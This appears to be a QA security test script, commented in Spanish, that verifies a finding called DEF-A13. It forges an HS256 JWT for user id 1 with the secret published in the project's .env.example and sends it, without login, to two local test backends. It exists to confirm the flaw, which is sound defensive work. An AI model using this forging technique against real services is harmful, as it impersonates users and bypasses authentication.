# =============================================
# Verificacion de DEF-A13: token fabricado con el secreto JWT publico
# ---------------------------------------------
# Firma un JWT para el usuario con id 1 usando el JWT_SECRET publicado en
# synapseed/.env.example y lo usa sin login contra dos backends: uno temporal
# levantado con ese secreto y el backend normal del ambiente QA (secreto aleatorio).
# Uso, con el ambiente QA arriba y desde una terminal de WSL en la raiz del repo:
#   docker compose -f env/docker-compose.qa.yml run -d --rm --name synapseed-qa-backend-public-secret \
#     -p 127.0.0.1:8001:8000 -e JWT_SECRET=<valor de synapseed/.env.example> \
#     backend uvicorn app.main:app --host 0.0.0.0 --port 8000
#   synapseed\src\backend\.venv\Scripts\python tests/auth-seguridad/security/forge_token_check.py
#   docker stop synapseed-qa-backend-public-secret

# =============================================
# Imports
# ---------------------------------------------
import json
import time
import urllib.error
import urllib.request
from pathlib import Path

from jose import jwt

# =============================================
# Constantes
# ---------------------------------------------
REPO_DIR = Path(__file__).resolve().parents[3]
ENV_EXAMPLE_PATH = REPO_DIR / "synapseed" / ".env.example"
TARGET_USER_ID = "1"
TOKEN_LIFETIME_SECONDS = 3600
TARGETS = [
    ("temporary backend with the .env.example secret", "http://127.0.0.1:8001/api/v1"),
    ("QA backend with a random secret", "http://127.0.0.1:8000/api/v1"),
]


# =============================================
# Funciones
# ---------------------------------------------
# Lee el JWT_SECRET publicado en .env.example
def read_public_secret():
    for line in ENV_EXAMPLE_PATH.read_text(encoding="utf-8").splitlines():
        if line.startswith("JWT_SECRET="):
            return line.split("=", 1)[1]
    raise KeyError("JWT_SECRET not found in " + str(ENV_EXAMPLE_PATH))


# Hace un GET con el token y devuelve codigo y cuerpo, sin lanzar en 4xx o 5xx
def get_with_token(url, token):
    request = urllib.request.Request(url, headers={"Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, response.read().decode("utf-8")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8")
    except urllib.error.URLError as error:
        return 0, "Not reachable: " + str(error.reason)


# Resume la respuesta del perfil sin volcar todo el cuerpo
def summarize_profile(status, body):
    if status != 200:
        return body[:160]
    profile = json.loads(body)
    return (
        "id="
        + str(profile["id"])
        + " identification="
        + profile["identification"]
        + " email="
        + profile["email"]
    )


# Fabrica el token y lo prueba contra cada backend
def main():
    now = int(time.time())
    claims = {"sub": TARGET_USER_ID, "iat": now, "exp": now + TOKEN_LIFETIME_SECONDS}
    token = jwt.encode(claims, read_public_secret(), algorithm="HS256")
    print(
        "Forged token: sub="
        + TARGET_USER_ID
        + ", signed with the JWT_SECRET published in synapseed/.env.example"
    )
    print("No password, login or prior session was used.")

    # Se consulta el perfil y las zonas del usuario con el token fabricado
    for label, base_url in TARGETS:
        status, body = get_with_token(base_url + "/users/me", token)
        print(
            "["
            + label
            + "] GET /users/me -> "
            + str(status)
            + " "
            + summarize_profile(status, body)
        )
        status, body = get_with_token(base_url + "/zones", token)
        print("[" + label + "] GET /zones -> " + str(status) + " " + body[:160])


main()
